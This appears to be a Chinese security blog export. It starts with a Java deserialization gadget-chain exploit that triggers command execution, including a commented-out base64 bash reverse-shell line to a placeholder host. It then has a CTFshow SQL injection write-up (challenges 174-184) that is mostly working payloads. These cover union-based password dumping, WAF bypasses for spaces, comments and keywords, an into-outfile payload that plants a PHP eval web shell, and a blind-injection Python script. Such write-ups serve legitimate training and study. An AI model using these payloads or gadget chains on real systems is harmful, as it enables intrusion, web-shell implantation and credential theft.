<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> OnlyJDK.ByUse_UnixPrintServiceLookup;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> OnlyJDK.Hessian2_OnlyJDK_Tool;</span><br><span class="line"><span class="keyword">import</span> Tool.Reflections;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONObject;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.utils.FastStringBuffer;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xpath.internal.objects.XString;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xpath.internal.objects.XStringForFSB;</span><br><span class="line"><span class="keyword">import</span> sun.print.UnixPrintServiceLookup;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.sound.sampled.AudioFileFormat;</span><br><span class="line"><span class="keyword">import</span> javax.sound.sampled.AudioFormat;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">use_UnixPrintServiceLookup</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">UnixPrintServiceLookup</span> <span class="variable">unixPrintServiceLookup</span> <span class="operator">=</span> Reflections.createWithoutConstructor(UnixPrintServiceLookup.class);</span><br><span class="line">        Reflections.setFieldValue(unixPrintServiceLookup, <span class="string">&quot;cmdIndex&quot;</span>, <span class="number">0</span>);</span><br><span class="line">        Reflections.setFieldValue(unixPrintServiceLookup, <span class="string">&quot;osname&quot;</span>, <span class="string">&quot;Ko1sh1&quot;</span>);</span><br><span class="line"><span class="comment">//        String cmd = &quot;;bash -c &#x27;&#123;echo,YmFzaCAtaSA+Ji9kZXYvdGNwL3h4Lnh4Lnh4Lnh4L3h4eDwmMQo=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;&quot;;</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;mousepad&quot;</span>;</span><br><span class="line">        Reflections.setFieldValue(unixPrintServiceLookup, <span class="string">&quot;lpcFirstCom&quot;</span>, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;cmd, cmd, cmd&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="type">JSONObject</span> <span class="variable">jsonObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONObject</span>();</span><br><span class="line">        jsonObject.put(<span class="string">&quot;Ko1sh1&quot;</span>,unixPrintServiceLookup);</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> <span class="variable">choice</span> <span class="operator">=</span> <span class="number">4</span>;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">trigger</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">switch</span> (choice)&#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                trigger = <span class="keyword">new</span> <span class="title class_">XString</span>(<span class="string">&quot;Ko1sh1&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                trigger = <span class="keyword">new</span> <span class="title class_">XStringForFSB</span>(<span class="keyword">new</span> <span class="title class_">FastStringBuffer</span>(),<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">                trigger = Reflections.createWithoutConstructor(AudioFileFormat.Type.class);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">                trigger = Reflections.createWithoutConstructor(AudioFormat.Encoding.class);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">map1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">map2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        map1.put(<span class="string">&quot;yy&quot;</span>,jsonObject);</span><br><span class="line">        map1.put(<span class="string">&quot;zZ&quot;</span>,trigger);</span><br><span class="line">        map2.put(<span class="string">&quot;yy&quot;</span>,trigger);</span><br><span class="line">        map2.put(<span class="string">&quot;zZ&quot;</span>,jsonObject);</span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> Reflections.NoLocalExecuteMap(map1,map2);</span><br><span class="line">        Hessian2_OnlyJDK_Tool.evilGenerate(o);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



















]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>java 反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>CTFshow SQL注入解题记录</title>
    <url>/2021/12/24/blog_ctfshow_sql%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<h1 id="union联合注入"><a href="#union联合注入" class="headerlink" title="union联合注入"></a>union联合注入</h1><h2 id="174（限制数字-replace）"><a href="#174（限制数字-replace）" class="headerlink" title="174（限制数字-replace）"></a>174（限制数字-replace）</h2><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//检查结果是否有flag</span></span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/flag|[0-9]/i&#x27;</span>, <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>)))&#123;</span><br><span class="line">      <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;查询成功&#x27;</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>

<p>这里限制了flag字眼和数字，所以我们需要将数字全部替换掉(本题没有flag字段，不用更换flag，否则还需要根据所在位置进行相应处理)</p>
<h3 id="关键步骤"><a href="#关键步骤" class="headerlink" title="关键步骤"></a>关键步骤</h3><p><strong>方法：将数据to_base64加密，然后将里面所有的数字用replace()替换</strong>（本题会将数字替换掉，且测试order有两行，所以这里select写的’a’,replace()这种。其他题用的话复制粘贴注意一下)</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; union select &#x27;</span>a<span class="string">&#x27;,replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(password,&#x27;</span><span class="number">0</span><span class="string">&#x27;,&#x27;</span>koishia<span class="string">&#x27;),&#x27;</span><span class="number">1</span><span class="string">&#x27;,&#x27;</span>koishib<span class="string">&#x27;),&#x27;</span><span class="number">2</span><span class="string">&#x27;,&#x27;</span>koishic<span class="string">&#x27;),&#x27;</span><span class="number">3</span><span class="string">&#x27;,&#x27;</span>koishid<span class="string">&#x27;),&#x27;</span><span class="number">4</span><span class="string">&#x27;,&#x27;</span>koishie<span class="string">&#x27;),&#x27;</span><span class="number">5</span><span class="string">&#x27;,&#x27;</span>koishif<span class="string">&#x27;),&#x27;</span><span class="number">6</span><span class="string">&#x27;,&#x27;</span>koishig<span class="string">&#x27;),&#x27;</span><span class="number">7</span><span class="string">&#x27;,&#x27;</span>koishih<span class="string">&#x27;),&#x27;</span><span class="number">8</span><span class="string">&#x27;,&#x27;</span>koishii<span class="string">&#x27;),&#x27;</span><span class="number">9</span><span class="string">&#x27;,&#x27;</span>koishij<span class="string">&#x27;) from ctfshow_user4 --+</span></span><br></pre></td></tr></table></figure></div>



<p>然后写个简单的py脚本换回来就行,字符串不长，自己手动换也行 &#x3D;。&#x3D;</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="string">&#x27;xxx&#x27;</span></span><br><span class="line">a= a.replace(<span class="string">&#x27;koishia&#x27;</span>,<span class="string">&quot;0&quot;</span>)</span><br><span class="line">a= a.replace(<span class="string">&#x27;koishib&#x27;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">a= a.replace(<span class="string">&#x27;koishic&#x27;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">a= a.replace(<span class="string">&#x27;koishid&#x27;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line">a= a.replace(<span class="string">&#x27;koishie&#x27;</span>,<span class="string">&quot;4&quot;</span>)</span><br><span class="line">a= a.replace(<span class="string">&#x27;koishif&#x27;</span>,<span class="string">&quot;5&quot;</span>)</span><br><span class="line">a= a.replace(<span class="string">&#x27;koishig&#x27;</span>,<span class="string">&quot;6&quot;</span>)</span><br><span class="line">a= a.replace(<span class="string">&#x27;koishih&#x27;</span>,<span class="string">&quot;7&quot;</span>)</span><br><span class="line">a= a.replace(<span class="string">&#x27;koishii&#x27;</span>,<span class="string">&quot;8&quot;</span>)</span><br><span class="line">a= a.replace(<span class="string">&#x27;koishij&#x27;</span>,<span class="string">&quot;9&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br></pre></td></tr></table></figure></div>



<h3 id="具体题解步骤"><a href="#具体题解步骤" class="headerlink" title="具体题解步骤"></a>具体题解步骤</h3><ul>
<li><strong>查看列数</strong></li>
</ul>
<p>用order一个一个试</p>
<ul>
<li><strong>数据库</strong></li>
</ul>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; union select &#x27;</span>a<span class="string">&#x27;,database()--+</span></span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20220814155354104.png"
                      alt="image-20220814155354104"
                ></p>
<ul>
<li><strong>数据表</strong></li>
</ul>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27; union select &#x27;</span>a<span class="string">&#x27;,replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(group_concat(table_name),&#x27;</span><span class="number">0</span><span class="string">&#x27;,&#x27;</span>koishia<span class="string">&#x27;),&#x27;</span><span class="number">1</span><span class="string">&#x27;,&#x27;</span>koishib<span class="string">&#x27;),&#x27;</span><span class="number">2</span><span class="string">&#x27;,&#x27;</span>koishic<span class="string">&#x27;),&#x27;</span><span class="number">3</span><span class="string">&#x27;,&#x27;</span>koishid<span class="string">&#x27;),&#x27;</span><span class="number">4</span><span class="string">&#x27;,&#x27;</span>koishie<span class="string">&#x27;),&#x27;</span><span class="number">5</span><span class="string">&#x27;,&#x27;</span>koishif<span class="string">&#x27;),&#x27;</span><span class="number">6</span><span class="string">&#x27;,&#x27;</span>koishig<span class="string">&#x27;),&#x27;</span><span class="number">7</span><span class="string">&#x27;,&#x27;</span>koishih<span class="string">&#x27;),&#x27;</span><span class="number">8</span><span class="string">&#x27;,&#x27;</span>koishii<span class="string">&#x27;),&#x27;</span><span class="number">9</span><span class="string">&#x27;,&#x27;</span>koishij<span class="string">&#x27;) from information_schema.tables where table_schema=&#x27;</span>ctfshow_web<span class="string">&#x27;--+</span></span><br></pre></td></tr></table></figure></div>



<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20220814160116958.png"
                      alt="image-20220814160116958"
                ></p>
<ul>
<li><strong>字段名</strong></li>
</ul>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27; union select &#x27;</span>a<span class="string">&#x27;,group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>ctfshow_user4<span class="string">&#x27;--+</span></span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20220814160521291.png"
                      alt="image-20220814160521291"
                ></p>
<ul>
<li><strong>字段值</strong></li>
</ul>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; union select &#x27;</span>a<span class="string">&#x27;,replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(password,&#x27;</span><span class="number">0</span><span class="string">&#x27;,&#x27;</span>koishia<span class="string">&#x27;),&#x27;</span><span class="number">1</span><span class="string">&#x27;,&#x27;</span>koishib<span class="string">&#x27;),&#x27;</span><span class="number">2</span><span class="string">&#x27;,&#x27;</span>koishic<span class="string">&#x27;),&#x27;</span><span class="number">3</span><span class="string">&#x27;,&#x27;</span>koishid<span class="string">&#x27;),&#x27;</span><span class="number">4</span><span class="string">&#x27;,&#x27;</span>koishie<span class="string">&#x27;),&#x27;</span><span class="number">5</span><span class="string">&#x27;,&#x27;</span>koishif<span class="string">&#x27;),&#x27;</span><span class="number">6</span><span class="string">&#x27;,&#x27;</span>koishig<span class="string">&#x27;),&#x27;</span><span class="number">7</span><span class="string">&#x27;,&#x27;</span>koishih<span class="string">&#x27;),&#x27;</span><span class="number">8</span><span class="string">&#x27;,&#x27;</span>koishii<span class="string">&#x27;),&#x27;</span><span class="number">9</span><span class="string">&#x27;,&#x27;</span>koishij<span class="string">&#x27;) from ctfshow_user4 --+</span></span><br></pre></td></tr></table></figure></div>



<h2 id="175-webshell-outfile"><a href="#175-webshell-outfile" class="headerlink" title="175(webshell,outfile)"></a>175(webshell,outfile)</h2><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">查询语句</span><br><span class="line"></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>拼接<span class="keyword">sql</span>语句查找指定ID用户</span><br><span class="line">$<span class="keyword">sql</span> <span class="operator">=</span> &quot;select username,password from ctfshow_user5 where username !=&#x27;flag&#x27; and id = &#x27;&quot;.$_GET[<span class="string">&#x27;id&#x27;</span>].&quot;&#x27; limit 1;&quot;;</span><br><span class="line">      </span><br><span class="line">返回逻辑</span><br><span class="line"></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>检查结果是否有flag</span><br><span class="line">    if(<span class="operator">!</span>preg_match(<span class="string">&#x27;/[\x00-\x7f]/i&#x27;</span>, json_encode($ret)))&#123;</span><br><span class="line">      $ret[<span class="string">&#x27;msg&#x27;</span>]<span class="operator">=</span><span class="string">&#x27;查询成功&#x27;</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>

<p>过滤了 ASCII 的0-127字符，我们可以使用盲注或者利用读写文件写入网站根目录</p>
<h3 id="解法1"><a href="#解法1" class="headerlink" title="解法1"></a>解法1</h3><p><strong>写入一个webshell使用蚁剑连接，然后读取文件</strong></p>
<p>未处理的sql语句</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27; union select 1,&quot;&lt;?php eval($_POST[1]);?&gt;&quot; into outfile&#x27;</span><span class="operator">/</span>var<span class="operator">/</span>www<span class="operator">/</span>html<span class="operator">/</span><span class="number">1.</span>php</span><br></pre></td></tr></table></figure></div>



<p><code>&lt;?php eval($_POST[1]);?&gt;</code>的base64编码</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">PD9waHAgZXZhbCgkX1BPU1RbMV0pOz8+</span><br></pre></td></tr></table></figure></div>



<p><code>PD9waHAgZXZhbCgkX1BPU1RbMV0pOz8+</code>的Url编码</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">%50%44%39%77%61%48%41%67%5a%58%5a%68%62%43%67%6b%58%31%42%50%55%31%52%62%4d%56%30%70%4f%7a%38%2b</span><br></pre></td></tr></table></figure></div>



<h4 id="playload"><a href="#playload" class="headerlink" title="playload"></a>playload</h4><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27; union select 1,from_base64(&quot;%50%44%39%77%61%48%41%67%5a%58%5a%68%62%43%67%6b%58%31%42%50%55%31%52%62%4d%56%30%70%4f%7a%38%2b&quot;)into outfile&#x27;/var/www/html/1.php</span><br></pre></td></tr></table></figure></div>



<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20220814175822042.png"
                      alt="image-20220814175822042"
                ></p>
<h4 id="蚁剑操作"><a href="#蚁剑操作" class="headerlink" title="蚁剑操作"></a>蚁剑操作</h4><p><strong>连接成功后，在&#x2F;var&#x2F;www&#x2F;html&#x2F;api&#x2F;config.php找到mysql的root的密码</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20220814180235512.png"
                      alt="image-20220814180235512"
                ></p>
<p><strong>在连接处登录数据库</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20220814180713927.png"
                      alt="image-20220814180713927"
                ></p>
<p>在左边选择我们需要的数据库然后点击执行就行了</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20220814180755995.png"
                      alt="image-20220814180755995"
                ></p>
<h3 id="解法2："><a href="#解法2：" class="headerlink" title="解法2："></a>解法2：</h3><p><strong>先盲注判断字段名</strong>（我 ctfshow 在 url 的 id 上输入sql语句没有执行，所以没做盲注脚本，这题时间盲注应该也可以）</p>
<p><strong>然后将数据输出到一个文件中，然后访问对应文件</strong></p>
<h4 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h4><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27; union select  username,password from ctfshow_user5 into outfile &quot;/var/www/html/1.txt&quot;--+</span></span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20220814181217820.png"
                      alt="image-20220814181217820"
                ></p>
<h1 id="过滤"><a href="#过滤" class="headerlink" title="过滤"></a>过滤</h1><h2 id="176（绕过select）"><a href="#176（绕过select）" class="headerlink" title="176（绕过select）"></a>176（绕过select）</h2><h3 id="解法一"><a href="#解法一" class="headerlink" title="解法一"></a>解法一</h3><p>万能密码都能解？</p>
<h3 id="解法二"><a href="#解法二" class="headerlink" title="解法二"></a>解法二</h3><p>发现原来是过滤了select  &#x3D;。&#x3D; 随便大小写绕过就行</p>
<h2 id="177-179（绕过空格）"><a href="#177-179（绕过空格）" class="headerlink" title="177-179（绕过空格）"></a>177-179（绕过空格）</h2><h3 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h3><p><strong>无非就是试试：<code>/**/</code>   <code>%09</code>  <code>%0c</code> 等等之类的啦</strong></p>
<p><strong>还有些时候可以使用（）的方式绕过，详情见后续题</strong></p>
<p>从我的另一个笔记中copy过来的常用payload  ：） </p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">%20 %09 %0a %0b %0c %0d %a0 %00 /**/ /!/</span><br></pre></td></tr></table></figure></div>



<h2 id="180（绕过注释符）"><a href="#180（绕过注释符）" class="headerlink" title="180（绕过注释符）"></a>180（绕过注释符）</h2><p><strong>这里它将部分空格符和注释符过滤了</strong></p>
<p><strong>绕过注释符的方法：</strong></p>
<h3 id="方法1"><a href="#方法1" class="headerlink" title="方法1"></a>方法1</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">or&#x27;1&#x27;=&#x27;1 </span><br><span class="line">或者</span><br><span class="line">||&#x27;1</span><br></pre></td></tr></table></figure></div>

<p>这样来闭合后面的引号</p>
<p>这题的步骤</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27; order by 3 or&#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span>									（我这里<span class="keyword">order</span> <span class="keyword">by</span>没有执行成功，不知道为啥，用下面的<span class="keyword">select</span>一个一个试也行）</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;%0cunion%0cselect%0cdatabase(),2,3%0cand&#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span>			（这里好像把database放在第三个会出错）</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;%0cunion%0cselect%0c1,group_concat(table_name),3%0cfrom%0cinformation_schema.tables%0cwhere%0ctable_schema=&#x27;</span>ctfshow_web<span class="string">&#x27;||&#x27;</span><span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;%0cunion%0cselect%0c1,group_concat(column_name),3%0cfrom%0cinformation_schema.columns%0cwhere%0ctable_name=&#x27;</span>ctfshow_user<span class="string">&#x27;||&#x27;</span><span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;union%0cselecT%0c1,2,group_concat(password)%0cfrom%0cctfshow_user%0cwhere%0c&#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure></div>







<h3 id="方法2"><a href="#方法2" class="headerlink" title="方法2"></a><strong>方法2</strong></h3><p><strong>也可以使用 <code>-- </code>(–后加个空格) 绕过。</strong></p>
<p><strong>payload:</strong></p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;%0cunion%0cselect%0c1,2,(select%0cpassword%0cfrom%0cctfshow_user%0cwhere%0cusername%0c=%0c&#x27;</span>flag<span class="string">&#x27;)%0c--%0c</span></span><br></pre></td></tr></table></figure></div>





<h2 id="180-182-完全无空格"><a href="#180-182-完全无空格" class="headerlink" title="180-182(完全无空格)"></a>180-182(完全无空格)</h2><p>这里空格被全部限制了，而且select不再区分大小写，也就是说select和空格都无法使用了（180除外）</p>
<p>根据网上的说法：</p>
<p>payload（局限性，必须后台sql语句上满足后面说到的使用原理）</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;or(id=26)and&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure></div>



<p><strong>题目已经告诉：</strong></p>
<p>sql查询代码</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select id,username,password from ctfshow_user where username !=&#x27;flag&#x27; and id = &#x27;&quot;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>].<span class="string">&quot;&#x27; limit 1;&quot;</span>;</span><br></pre></td></tr></table></figure></div>

<p>过滤代码</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ |\*|\x09|\x0a|\x0b|\x0c|\x00|\x0d|\xa0|\x23|\##|file|into|select/i&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<p><strong>将我们的payload放入代码中</strong></p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line">where username !=<span class="string">&#x27;flag&#x27;</span> <span class="keyword">and</span> id = <span class="string">&#x27;&#x27;</span><span class="keyword">or</span>(id=<span class="number">26</span>)<span class="keyword">and</span><span class="string">&#x27;1&#x27;</span>=<span class="string">&#x27;1&#x27;</span> limit <span class="number">1</span>;<span class="string">&quot;;</span></span><br></pre></td></tr></table></figure></div>

<p>因为and的优先级比or大，相当于</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line">(username !=<span class="string">&#x27;flag&#x27;</span> <span class="keyword">and</span> id = <span class="string">&#x27;&#x27;</span>)  <span class="keyword">or</span>  (id=<span class="number">26</span><span class="keyword">and</span><span class="string">&#x27;1&#x27;</span>=<span class="string">&#x27;1&#x27;</span>)</span><br></pre></td></tr></table></figure></div>

<p>所以左边为0但是右边是1，所以where的条件是1，于是就去访问id&#x3D;26的元组。实际上我们做题的时候并不知道flag在哪个id中，所以我们还是得一个一个试才行</p>
<h2 id="183（from查询未禁where）"><a href="#183（from查询未禁where）" class="headerlink" title="183（from查询未禁where）"></a>183（from查询未禁where）</h2><p><strong>首先看提示需要post传参</strong></p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">$<span class="keyword">sql</span> <span class="operator">=</span> &quot;select count(pass) from &quot;.$_POST[<span class="string">&#x27;tableName&#x27;</span>].&quot;;</span><br></pre></td></tr></table></figure></div>

<p><strong>回显过滤</strong></p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\##|\x23|file|\=|or|\x7c|select|and|flag|into/i&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><strong>查询结果</strong></p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//返回用户表的记录总数</span></span><br><span class="line">      <span class="variable">$user_count</span> = <span class="number">0</span>;</span><br></pre></td></tr></table></figure></div>

<p>这里还ban掉了 <code>=</code>等号</p>
<p><strong>编写脚本注入</strong></p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://df43a7e7-0206-4b63-8744-138e17de79e9.challenge.ctf.show/select-waf.php&quot;</span></span><br><span class="line"></span><br><span class="line">flag=<span class="string">&quot;ctfshow&#123;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="string">&quot;0123456789abcdefghijklmnopqrstuvwxyz-&#123;&#125;&quot;</span>:</span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">&#x27;tableName&#x27;</span>:<span class="string">&quot;(ctfshow_user)where(pass)like&#x27;&#123;&#125;%&#x27;&quot;</span>.<span class="built_in">format</span>(flag+j)</span><br><span class="line">        &#125;</span><br><span class="line">        r=requests.post(url=url,data=data).text</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;$user_count = 1&quot;</span> <span class="keyword">in</span> r:</span><br><span class="line">            flag+=j</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">if</span> j==<span class="string">&#x27;&#125;&#x27;</span>:</span><br><span class="line">                exit()</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure></div>







<h2 id="184（禁用where和各种引号）"><a href="#184（禁用where和各种引号）" class="headerlink" title="184（禁用where和各种引号）"></a>184（禁用where和各种引号）</h2><p><strong>查询语句</strong></p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select count(*) from &quot;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;tableName&#x27;</span>].<span class="string">&quot;;&quot;</span>;</span><br></pre></td></tr></table></figure></div>

<p><strong>返回逻辑</strong></p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//对传入的参数进行了过滤</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\*|\x09|\x0a|\x0b|\x0c|\0x0d|\xa0|\x00|\##|\x23|file|\=|or|\x7c|select|and|flag|into|where|\x26|\&#x27;|\&quot;|union|\`|sleep|benchmark/i&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></div>

<p><strong>查询结果</strong></p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//返回用户表的记录总数</span></span><br><span class="line">      <span class="variable">$user_count</span> = <span class="number">0</span>;</span><br></pre></td></tr></table></figure></div>



<p>这里过滤了很多东西</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">where、空格、甚至还有&#x27;  &quot;  ` 这仨</span><br></pre></td></tr></table></figure></div>



<h3 id="做法"><a href="#做法" class="headerlink" title="做法"></a>做法</h3><p><strong>用right join绕过过滤</strong></p>
